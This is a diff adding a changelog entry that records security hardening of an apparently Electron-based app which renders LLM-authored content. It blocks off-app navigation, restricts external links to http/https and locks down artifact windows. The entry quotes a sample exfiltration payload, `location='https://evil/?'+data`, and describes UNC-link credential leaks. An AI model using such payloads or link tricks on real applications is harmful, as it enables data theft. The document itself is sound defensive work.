@@ -1,3 +1,29 @@
+## 2026-07-02 — JM-19: Electron shell navigation + artifact hardening (SEC-1, SEC-2, SEC-8)
+
+- **SEC-1**: the main window had NO `will-navigate` guard, so any top-frame
+  navigation (a crafted link in rendered model/research output) handed the
+  destination origin the full privileged `window.api` — arbitrary file read,
+  MCP spawn, shell. Added `will-navigate` gated on `isAppNavigationUrl` (dev
+  server origin, or the packaged `file://` renderer); off-app http(s) targets
+  open in the system browser instead. Also denied `<webview>` attachment
+  app-wide (`web-contents-created` → `will-attach-webview` preventDefault).
+- **SEC-2**: `setWindowOpenHandler` forwarded ANY scheme to
+  `shell.openExternal` — a `file://`, custom-protocol, or `\attacker\share`
+  UNC link launched a local program or leaked NTLM creds on click. Now
+  http/https only, matching the shell:openExternal IPC guard.
+- **SEC-8**: artifact HTML is LLM-authored (untrusted). Added `form-action
+  'none'` to every artifact CSP and a `lockDownArtifactContents` helper that
+  denies window-open + navigation on both the docked WebContentsView and the
+  popped-out BrowserWindow — closing the `location='https://evil/?'+data`
+  self-exfil channel that connect-src doesn't cover. Programmatic loadFile
+  from the main process doesn't emit will-navigate, so re-renders still work.
+
+New `security-hardening.test.ts` source-locks all five guard sites.
+
+Gate: security-hardening 5/5 green; tsc node OK.
+
+---
+
 ## 2026-07-02 — JM-18: FTS quoting, retention sweep, encrypted backups, hot-path perf (DB-8, DB-9, DB-11, DB-16, DB-17)
 
 - **DB-8**: `searchSessions` quotes each token (the rag/retrieve strategy) so
